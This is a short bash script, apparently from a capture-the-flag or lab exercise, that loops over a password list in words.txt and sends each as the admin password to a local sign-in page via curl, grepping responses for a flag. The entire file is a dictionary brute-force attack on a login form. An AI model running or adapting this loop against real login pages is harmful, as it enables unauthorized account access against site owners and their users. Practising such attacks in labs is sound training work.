#!/usr/bin/env bash

INPUT_FILE="words.txt"

while read -r LINE; do
    echo "$LINE"
    curl "http://localhost:8080/?page=signin&username=admin&password=${LINE}&Login=Login#" | grep flag
done < "$INPUT_FILE"

